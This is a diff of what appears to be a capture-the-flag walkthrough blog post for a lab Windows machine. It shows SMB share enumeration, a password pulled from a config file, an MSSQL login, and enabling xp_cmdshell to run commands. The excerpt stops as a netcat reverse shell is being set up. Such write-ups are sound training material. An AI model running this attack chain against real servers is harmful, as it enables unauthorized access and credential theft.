@@ -24,7 +24,7 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds
-```
+{% endhighlight %}
 
 We will try to see which folders are share.
 {% highlight plain %}
@@ -36,7 +36,7 @@ $ smbclient -L //10.129.221.7/
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
 
-```
+{% endhighlight %}
 
 And then try to connect to **backups**:
 {% highlight plain %}
@@ -45,11 +45,12 @@ smb: \> ls
 smb: \> get prod.dtsConfig
 smb: \> exit
 $ cat prod.dtsConfig  
-```
+{% endhighlight %}
+
 There we can see:
 {% highlight plain %}
 Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
-```
+{% endhighlight %}
 
 
 
@@ -57,33 +58,36 @@ Now we can try to login with the scripts **mssqlclient.py**.
 We will use the credentials provides by the **prod.dtsConfig** file.
 {% highlight plain %}
 $ sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.221.7 -windows-auth
-```
+{% endhighlight %}
 
 # [](#header-4)Foothold
 
 Now we are in the SQL server. With the command **xp_cmdshell** we can try to execute the shell, but we will recieve the following error:
 {% highlight plain %}
 [-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell'
-```
+{% endhighlight %}
+
 Now we need to activate xp_cmdshell. With the following command we can see all the config aviable.
 {% highlight plain %}
 SQL> sp_configure
-```
+{% endhighlight %}
+
 We need to activate the advanced options:
 {% highlight plain %}
 SQL> EXECUTE sp_configure 'show advanced options', 1;
 SQL> RECONFIGURE;
-```
+{% endhighlight %}
+
 And then we can activate the shell:
 {% highlight plain %}
 SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
 SQL> RECONFIGURE;
-```
+{% endhighlight %}
 
 Now we can get the **user flag**:
 {% highlight plain %}
 SQL> xp_cmdshell type C:\Users\sql_svc\Desktop\user.txt
-```
+{% endhighlight %}
 
 We will make a reverse shell.
 First we will start a nc in the port 443.
